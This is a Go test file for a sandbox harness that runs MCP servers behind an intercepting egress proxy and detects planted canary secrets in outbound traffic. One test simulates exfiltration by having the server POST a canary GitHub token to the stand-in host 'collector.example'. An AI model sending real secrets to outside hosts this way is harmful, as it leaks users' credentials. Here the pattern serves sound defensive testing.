package harness

import (
	"encoding/json"
	"io"
	"net"
	"net/http"
	"os"
	"slices"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/JairJosafath/mcp-customs/src/internal/canary"
	"github.com/JairJosafath/mcp-customs/src/internal/egress"
	"github.com/JairJosafath/mcp-customs/src/internal/findings"
)

// fakeEgress records what the harness asks of the egress proxy.
type fakeEgress struct {
	mu       sync.Mutex
	canaries canary.Set
	allowed  []string
	observe  egress.Observer
}

func (f *fakeEgress) Observe(o egress.Observer) { f.observe = o }

func (f *fakeEgress) SetCanaries(c canary.Set) {
	f.mu.Lock()
	defer f.mu.Unlock()
	f.canaries = c
}

func (f *fakeEgress) Allow(hosts ...string) []string {
	f.mu.Lock()
	defer f.mu.Unlock()
	f.allowed = append(f.allowed, hosts...)
	slices.Sort(f.allowed)
	return slices.Clone(f.allowed)
}

func (f *fakeEgress) Env() []string { return []string{"HTTPS_PROXY=http://127.0.0.1:3128"} }

func TestTheRunHookGivesTheProxyTheRunsCanaries(t *testing.T) {
	eg := &fakeEgress{}
	run := newIdleRunWith(t, &fakeInstaller{}, func(c *Config) { c.Egress = eg })
	if eg.canaries != nil {
		t.Fatalf("before /run the proxy has canaries %v; the snapshot must hold none", eg.canaries)
	}
	if status, body := run.hook(t, "POST", HooksPrefix+"run", runHookRequest(t, testToken, testCanaries)); status != http.StatusOK {
		t.Fatalf("POST /run = %d %s", status, body)
	}
	if len(eg.canaries) != len(testCanaries) {
		t.Fatalf("the proxy searches for %v, want the run's %d canaries", eg.canaries, len(testCanaries))
	}
	for i, c := range testCanaries {
		if eg.canaries[i] != (canary.Canary{Kind: canary.Kind(c.Kind), Value: c.Value}) {
			t.Errorf("canary %d = %+v, want %+v", i, eg.canaries[i], c)
		}
	}
}

func TestAllowAddsToTheEgressAllowlistAndRefusesWhatIsNotAHost(t *testing.T) {
	eg := &fakeEgress{}
	run := newTestRunWith(t, func(c *Config) { c.Egress = eg })
	status, body := run.do(t, "POST", "/allow", map[string]any{"hosts": []string{"api.weather.example"}})
	if status != http.StatusOK || !jsonEqual(t, body["hosts"], json.RawMessage(`["api.weather.example"]`)) {
		t.Errorf("POST /allow = %d %v", status, body)
	}
	for _, bad := range []string{"", "evil.example/path", "user@evil.example", "evil.example:443", "a b"} {
		if status, _ := run.do(t, "POST", "/allow", map[string]any{"hosts": []string{bad}}); status != http.StatusBadRequest {
			t.Errorf("POST /allow %q = %d, want 400", bad, status)
		}
	}
	if status, _ := run.do(t, "POST", "/install", map[string]any{"kind": "go", "ref": "example.com/weather@v1.0.0", "allowHosts": []string{"proxy.example"}}); status != http.StatusOK {
		t.Fatalf("POST /install = %d", status)
	}
	if !slices.Contains(eg.allowed, "proxy.example") {
		t.Errorf("the install's allowHosts were not allowed: %v", eg.allowed)
	}
}

func TestAllowWithoutAnEgressProxyIsAConflict(t *testing.T) {
	run := newTestRun(t, &fakeInstaller{})
	if status, _ := run.do(t, "POST", "/allow", map[string]any{"hosts": []string{"api.weather.example"}}); status != http.StatusConflict {
		t.Errorf("POST /allow = %d, want 409", status)
	}
}

func newTestRunWith(t *testing.T, change func(*Config)) testRun {
	t.Helper()
	run := newIdleRunWith(t, &fakeInstaller{}, change)
	if status, body := run.hook(t, "POST", HooksPrefix+"run", runHookRequest(t, testToken, testCanaries)); status != http.StatusOK {
		t.Fatalf("POST /run = %d %s", status, body)
	}
	return run
}

// startEgress serves a real egress proxy for the test, its trust files in
// trustDir, and answers it and where it listens.
func startEgress(t *testing.T, trustDir string, resolver egress.Resolver) (*egress.Egress, *egress.Listeners) {
	t.Helper()
	ca, err := egress.NewCA(func() time.Time { return testNow })
	if err != nil {
		t.Fatal(err)
	}
	trust, err := egress.WriteTrust(trustDir, ca, nil)
	if err != nil {
		t.Fatal(err)
	}
	l, err := egress.Listen(t.Context())
	if err != nil {
		t.Fatal(err)
	}
	eg := egress.New(egress.Config{
		CA:        ca,
		Upstream:  refusingUpstream{},
		Resolver:  resolver,
		ServerEnv: egress.Env(l.Proxy.Addr().String(), trust),
	})
	t.Cleanup(eg.Serve(l, egress.RedirectedFrom))
	return eg, l
}

// refusingUpstream stands in for the internet: these tests allow no host.
type refusingUpstream struct{}

func (refusingUpstream) RoundTrip(*http.Request) (*http.Response, error) {
	return nil, io.ErrUnexpectedEOF
}

// decoded is the observations of kind, their details decoded as T.
func decoded[T any](t *testing.T, obs []rawObservation, kind ObservationKind) []T {
	t.Helper()
	var out []T
	for _, o := range obs {
		if o.Kind != kind {
			continue
		}
		var d T
		if err := json.Unmarshal(o.Detail, &d); err != nil {
			t.Fatal(err)
		}
		out = append(out, d)
	}
	return out
}

func TestTheServerGoesThroughTheProxyAndTrustsItsCA(t *testing.T) {
	trustDir := t.TempDir()
	eg, _ := startEgress(t, trustDir, net.DefaultResolver)
	run := newIdleRunWith(t, &fakeInstaller{}, func(c *Config) { c.Egress = eg })
	if status, body := run.hook(t, "POST", HooksPrefix+"run", runHookRequest(t, testToken, testCanaries)); status != http.StatusOK {
		t.Fatalf("POST /run = %d %s", status, body)
	}
	startTestServerIn(t, run)
	if status, body := run.do(t, http.MethodPost, "/start", nil); status != http.StatusOK {
		t.Fatalf("POST /start = %d %v", status, body)
	}

	env := strings.Split(toolText(t, call(t, run, "env", nil)), "\n")
	for _, want := range egress.Env(strings.TrimPrefix(envValue(env, "HTTPS_PROXY"), "http://"), egress.Trust{CAFile: trustDir + "/ca.pem", BundleFile: trustDir + "/ca-bundle.pem"}) {
		if !slices.Contains(env, want) {
			t.Errorf("the server's environment lacks %s", want)
		}
	}

	// The test server is a Go binary using http.DefaultClient: it finds
	// the proxy in HTTPS_PROXY and trusts the CA through Go's system pool,
	// which SSL_CERT_FILE names. A handshake it refused would answer an error.
	body := call(t, run, "post", map[string]string{"url": "https://collector.example/u?id=1", "body": "t=" + testCanaries[0].Value})
	if got := toolText(t, body); got != "200 OK" {
		t.Errorf("the server's POST got %q, want the proxy's fake 200 OK", got)
	}
	obs := observations(t, body)
	tunnels := decoded[egress.ConnectDetail](t, obs, ObservedConnect)
	if len(tunnels) != 1 || tunnels[0] != (egress.ConnectDetail{Host: "collector.example", Port: 443, Via: "proxy", Intercepted: true}) {
		t.Errorf("connect observations = %+v, want one intercepted tunnel", tunnels)
	}
	requests := decoded[egress.HTTPDetail](t, obs, ObservedHTTP)
	want := egress.HTTPDetail{
		Method: http.MethodPost, Host: "collector.example", Path: "/u", Allowed: false,
		Canaries: []findings.Match{{Canary: canary.GitHubToken, Encoding: findings.Plain}},
	}
	if len(requests) != 1 || !jsonEqual(t, mustJSON(t, requests[0]), mustJSON(t, want)) {
		t.Errorf("http observations = %+v, want %+v", requests, want)
	}
}

// startTestServerIn installs the test server in run, with a fake.
func startTestServerIn(t *testing.T, run testRun) {
	t.Helper()
	exe, err := os.Executable()
	if err != nil {
		t.Fatal(err)
	}
	inst, ok := run.h.cfg.Installer.(*fakeInstaller)
	if !ok {
		t.Fatal("the run's installer is not a fake")
	}
	inst.out = Installed{Resolved: []byte("mod test\n"), Command: []string{exe, testServerArg}}
	if status, body := run.do(t, http.MethodPost, "/install", installBody("go", "example.com/weather@v1.0.0")); status != http.StatusOK {
		t.Fatalf("POST /install = %d %v", status, body)
	}
}

func envValue(env []string, name string) string {
	for _, kv := range env {
		if v, ok := strings.CutPrefix(kv, name+"="); ok {
			return v
		}
	}
	return ""
}
